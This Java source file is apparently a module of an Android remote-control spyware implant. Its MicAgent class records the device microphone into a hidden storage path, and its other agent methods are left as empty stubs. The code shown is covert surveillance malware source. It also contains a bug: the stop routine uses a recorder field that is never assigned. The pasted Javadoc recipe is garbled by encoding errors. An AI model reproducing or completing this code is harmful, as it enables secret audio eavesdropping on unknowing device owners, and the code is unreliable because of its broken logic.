package com.ht.RCSAndroidGUI.agent;

import java.io.IOException;

import android.media.MediaRecorder;

import com.ht.RCSAndroidGUI.file.Path;

/**
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 *       Recipe: Recording Audio Files Recording audio using MediaRecorder is
 *       similar to playback from the previous recipe, except a few more things
 *       need to be specified (note, DEFAULT can also be used and is the same as
 *       the first choice in these lists): n MediaRecorder.AudioSource: n
 *       MICÑBuilt-in microphone n VOICE_UPLINKÑTransmitted audio during voice
 *       call n VOICE_DOWNLINKÑReceived audio during voice call n
 *       VOICE_CALLÑBoth uplink and downlink audio during voice call n
 *       CAMCORDERÑMicrophone associated with camera if available n
 *       VOICE_RECOGNITIONÑMicrophone tuned for voice recognition if available n
 *       MediaRecorder.OutputFormat: n THREE_GPPÑ3GPP media file format n
 *       MPEG_4ÑMPEG4 media file format n AMR_NBÑAdaptive multirate narrowband
 *       file format Audio 157 158 Chapter 6 Multimedia Techniques n
 *       MediaRecorder.AudioEncoder: n AMR_NBÑAdaptive multirate narrowband
 *       vocoder The steps to record audio are 1. Create an instance of the
 *       MediaRecorder: MediaRecorder m_Recorder = new MediaRecorder(); 2.
 *       Specify the source of media, for example the microphone:
 *       m_Recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 3. Set the
 *       output file format and encoding, such as:
 *       m_Recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
 *       m_Recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 4. Set
 *       the path for the file to be saved: m_Recorder.setOutputFile(path); 5.
 *       Prepare and start the recording: m_Recorder.prepare();
 *       m_Recorder.start(); These steps for audio recording can be used just as
 *       they were in the previous recipe for playback.
 * @author zeno
 * 
 */
public class MicAgent extends AgentBase {

	MediaRecorder recorder;

	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	@Override
	public void parse(final byte[] conf) {
		// TODO Auto-generated method stub

	}

	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

	// SNIPPET
	private void startRecorder() throws IllegalStateException, IOException {
		final MediaRecorder recorder = new MediaRecorder();
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		recorder.setOutputFile(Path.hidden() + "currentRec");
		recorder.prepare();
		recorder.start(); // Recording is now started

	}

	// SNIPPET
	private void stopRecorder() {

		recorder.stop();
		recorder.reset(); // You can reuse the object by going back to
							// setAudioSource() step
		recorder.release(); // Now the object cannot be reused
	}

}
